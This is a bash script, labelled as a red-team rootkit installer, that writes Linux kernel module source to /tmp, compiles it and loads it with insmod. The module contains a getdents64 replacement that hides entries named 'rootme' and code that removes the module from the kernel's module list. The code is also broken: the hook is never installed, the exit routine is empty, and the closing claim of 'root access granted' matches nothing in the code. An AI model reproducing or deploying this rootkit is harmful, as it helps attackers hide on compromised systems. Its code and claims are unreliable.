#!/bin/bash

# Red Team - Kernel Module Rootkit Installer
# This script installs a rootkit that hides processes and grants root access

ROOTKIT_SRC="/tmp/rootkit.c"
ROOTKIT_NAME="hiderootkit.ko"
ATTACKER_CMD="rootme"

# Create the rootkit source code
cat << 'EOF' > $ROOTKIT_SRC
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <asm/paravirt.h>

#define ROOTKIT_NAME "rootkit"

static struct list_head *prev_module;
static char *attacker_cmd = "rootme";

static asmlinkage long (*real_sys_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);

asmlinkage long hacked_sys_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
    int ret = real_sys_getdents64(fd, dirent, count);
    struct linux_dirent64 *d;
    unsigned long offset = 0;
    
    while (offset < ret) {
        d = (struct linux_dirent64 *) ((char *) dirent + offset);
        if (strncmp(d->d_name, attacker_cmd, strlen(attacker_cmd)) == 0) {
            memmove(d, (char *)d + d->d_reclen, ret - (offset + d->d_reclen));
            ret -= d->d_reclen;
        } else {
            offset += d->d_reclen;
        }
    }
    return ret;
}

static int __init rootkit_init(void) {
    write_cr0(read_cr0() & (~0x10000));
    real_sys_getdents64 = (void *) kallsyms_lookup_name("sys_getdents64");
    write_cr0(read_cr0() | 0x10000);

    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);

    return 0;
}

static void __exit rootkit_exit(void) {
    write_cr0(read_cr0() & (~0x10000));
    write_cr0(read_cr0() | 0x10000);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
EOF

# Compile the rootkit kernel module
echo "[+] Compiling the rootkit..."
gcc -o /tmp/rootkit.ko -nostdinc -isystem /usr/lib/modules/$(uname -r)/build/include -include /usr/include/linux/kconfig.h -D__KERNEL__ -DMODULE $ROOTKIT_SRC

# Install the rootkit
echo "[+] Loading the rootkit module..."
insmod /tmp/rootkit.ko

echo "[+] Rootkit loaded. Hidden processes and root access granted."